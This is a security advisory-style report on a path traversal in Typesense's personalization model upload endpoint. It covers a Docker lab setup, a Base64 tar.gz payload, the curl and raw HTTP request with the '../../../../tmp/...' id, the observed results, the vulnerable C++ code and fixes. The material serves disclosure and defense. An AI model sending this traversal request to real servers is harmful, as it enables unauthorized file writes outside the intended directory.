### Vulnerability details

**Official website / Product:** https://typesense.org / https://github.com/typesense/typesense

**Repository:** typesense/typesense (stars at selection: 27000)

**Vulnerability type:** file_upload (personalization model `id` path traversal → create directory and extract/write outside `/data/models`)

**Vulnerability versions:** Official Docker `typesense/typesense:30.2`; sink also present on default-branch tip `9ff8fb05af974a1c51f48c5d95ed5e4887626623` (`PersonalizationModel::get_model_subdir`). Affects deployments that expose `POST /personalization/models` to an API key allowed to create personalization models (typically the bootstrap admin key).

**Vulnerability URL / Parameter:** `POST /personalization/models?id=` — unsanitized `id` query param (e.g. `../../../../tmp/r38a9id2`); also requires `name=ts/tyrec-1`, `type=recommendation`, body = `.tar.gz` model package.

**Complex:** yes

### Verification procedure

1. Start the lab with the compose below (host port **21809** → container `8108`, API key `r38a9apikey`):

```yaml
# docker-compose.yml (reconstructable lab)
services:
  typesense:
    image: typesense/typesense:30.2
    container_name: typesense-r38-a9
    command: ["--data-dir", "/data", "--api-key", "r38a9apikey", "--enable-cors"]
    ports:
      - "21809:8108"
    volumes:
      - tsdata:/data

volumes:
  tsdata:
```

```bash
docker compose up -d
# wait until /health is ready; host base URL http://127.0.0.1:21809
curl -sS "http://127.0.0.1:21809/health"
```

2. Reconstruct the model package `idtrav.tar.gz` from Base64 below (269 bytes, sha256 `5ebc9082af7c0312d50c3e93ee023026acfef4d751e890b82f65ca17389fce03`; contains `recommendation_model.onnx` / `user_model.onnx` / `item_model.onnx`):

```bash
base64 -d <<'B64' > idtrav.tar.gz
H4sICEQG6GoC/2lkdHJhdi50YXIA7dfBbsIgHMdxzj6F4ewaGlqbeDPZA+y+LAsrHJwC9Q81mmXvPubJ9GLMRrfY3+cCoQdOX6BkWm+tcVrFjXev1muzK7xzR/Z7RLKsqvOYDMfvrxfztF5KIUs2F2wEfYiK0vZsmnRv7WnGYKL6YChP9T/pvxRCon/0D7ltorH/r3/RLNE/+ofsDr5Vb0U8xox73Ny/aOqmQv9jeH5aP76g/8nqyNsuhuI9ePdn/UsxvP+lrNH/GD74nq/4vjd04guu01z7ln/iRJgIq2hrKO8D4Gr/ZT28//H+H+v/Tz9EUgdDQe0QPQAAAAAAAADA/fkCoXplRQAoAAA=
B64
sha256sum idtrav.tar.gz
# expected: 5ebc9082af7c0312d50c3e93ee023026acfef4d751e890b82f65ca17389fce03
```

3. POST with path-traversal `id=../../../../tmp/r38a9id2` (curl URL-encodes to `..%2F..%2F..%2F..%2Ftmp%2Fr38a9id2`):

```bash
curl -sS -D- \
  -H 'X-TYPESENSE-API-KEY: r38a9apikey' \
  -H 'Content-Type: application/gzip' \
  --data-binary @idtrav.tar.gz \
  'http://127.0.0.1:21809/personalization/models?name=ts/tyrec-1&type=recommendation&id=../../../../tmp/r38a9id2'
```

4. Inside the container confirm the escaped directory and extracted files:

```bash
docker exec typesense-r38-a9 ls -la /tmp/r38a9id2
```

Destination should have been `/data/models/per_<id>/` only; files land under `/tmp/r38a9id2/`. Observed listing:

```text
/tmp/r38a9id2:
total 20
drwxr-xr-x 2 root root 4096 Nov  2 03:44 .
drwxrwxrwt 1 root root 4096 Nov  2 03:44 ..
-rw-r--r-- 1 root root    6 Jan  1  1970 item_model.onnx
-rw-r--r-- 1 root root    6 Jan  1  1970 recommendation_model.onnx
-rw-r--r-- 1 root root    6 Jan  1  1970 user_model.onnx
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified). Body is binary gzip; the following is the complete **Base64** (exactly 269 bytes on the wire, sha256 `5ebc9082af7c0312d50c3e93ee023026acfef4d751e890b82f65ca17389fce03`), losslessly reconstructible as the request body:

```http
POST /personalization/models?name=ts/tyrec-1&type=recommendation&id=../../../../tmp/r38a9id2 HTTP/1.1
Host: 127.0.0.1:21809
User-Agent: curl/8.22.0
Accept: */*
X-TYPESENSE-API-KEY: r38a9apikey
Content-Type: application/gzip
Content-Length: 269
Connection: close

H4sICEQG6GoC/2lkdHJhdi50YXIA7dfBbsIgHMdxzj6F4ewaGlqbeDPZA+y+LAsrHJwC9Q81mmXvPubJ9GLMRrfY3+cCoQdOX6BkWm+tcVrFjXev1muzK7xzR/Z7RLKsqvOYDMfvrxfztF5KIUs2F2wEfYiK0vZsmnRv7WnGYKL6YChP9T/pvxRCon/0D7ltorH/r3/RLNE/+ofsDr5Vb0U8xox73Ny/aOqmQv9jeH5aP76g/8nqyNsuhuI9ePdn/UsxvP+lrNH/GD74nq/4vjd04guu01z7ln/iRJgIq2hrKO8D4Gr/ZT28//H+H+v/Tz9EUgdDQe0QPQAAAAAAAADA/fkCoXplRQAoAAA=
```

Complete HTTP response (Docker-verified raw response):

```http
HTTP/1.1 400 Bad Request
Connection: keep-alive
access-control-allow-origin: *
content-type: application/json; charset=utf-8
transfer-encoding: chunked

{"message":"Missing the required vocab.txt file in archive"}
```

Verification result notes:

- HTTP 400 `Missing the required vocab.txt file in archive` is expected: `get_model_subdir` already ran `create_directories`, and `create_model` extracts before required-file checks; a failed check does not roll back writes already performed.
- In-container `ls -la /tmp/r38a9id2` shows the three `.onnx` files above (6-byte placeholders each).
- Path is built as `model_dir + "per_" + model_id` (default `model_dir=/data/models/`). With `id=../../../../tmp/r38a9id2`, the destination escapes to `/tmp/r38a9id2/` instead of the constrained `/data/models/per_<safe-id>/`.
- Independent sink from the sibling Zip Slip via archive entry names (VULN-0067): this bug is `id` → `get_model_subdir` directory traversal; that one is entry pathname → `ArchiveUtils` extract traversal.

### Vulnerability analysis

`POST /personalization/models` (`core_api.cpp` `post_personalization_model`) reads `id`/`name`/`type` from query params and passes the raw body as `model_data` into `PersonalizationModelManager::add_model`. `add_model` stores the attacker-controlled `id` into `model_json["id"]` and calls `PersonalizationModel::get_model_subdir(id)` plus `create_model`.

`get_model_subdir` concatenates `model_dir + "per_" + model_id` with no rejection of `/`, `..`, canonicalization, or prefix enforcement, then `std::filesystem::create_directories(full_path)`. `create_model` uses that path as the destination for `ArchiveUtils::extract_tar_gz_from_memory`. An attacker can therefore create directories and land extracted files outside the models tree (typically as root inside the container).

Trigger / sink source (full paths and line numbers):

```cpp
# File: repos/typesense/src/core_api.cpp
# Lines: 3386-3406
bool post_personalization_model(...) {
    ...
    if (req->params.count("id")) {
        req_json["id"] = req->params["id"];
        model_id = req->params["id"];
    }
    const std::string model_data = req->body;
    auto create_op = PersonalizationModelManager::add_model(req_json, model_id, true, model_data);
```

```cpp
# File: repos/typesense/src/personalization_model.cpp
# Lines: 8-21
std::string PersonalizationModel::get_model_subdir(const std::string& model_id) {
    std::string model_dir = EmbedderManager::get_model_dir();
    if (model_dir.back() != '/') {
        model_dir += '/';
    }
    std::string full_path = model_dir + "per_" + model_id;
    if (!std::filesystem::exists(full_path)) {
        std::filesystem::create_directories(full_path);
    }
    return full_path;
}
```

```cpp
# File: repos/typesense/src/personalization_model.cpp
# Lines: 109-127
Option<nlohmann::json> PersonalizationModel::create_model(...) {
    std::string model_path = get_model_subdir(model_id);
    if (!ArchiveUtils::extract_tar_gz_from_memory(model_data, model_path)) {
        return Option<nlohmann::json>(500, "Failed to extract model archive");
    }
    ...
    if (!std::filesystem::exists(tokenzier_path)) {
        return Option<nlohmann::json>(400, "Missing the required vocab.txt file in archive");
    }
```

This is unexpected versus the documented model-package install into `/data/models/per_<id>/`; it is not an intentional arbitrary-write admin API.

### Fix notes

1. Allow only a safe id charset (e.g. UUID / `[A-Za-z0-9_-]`); reject `/`, `\\`, and `.` sequences.
2. Normalize `full_path` (`weakly_canonical` / `lexically_normal`) and enforce a prefix under `model_dir`; return 400 on escape.
3. Extract to a temp directory first; atomically move only after validation; delete the temp dir on failure.
4. Harden `ArchiveUtils` together with VULN-0067 (`SECURE_NODOTDOT`, etc.) for defense in depth.
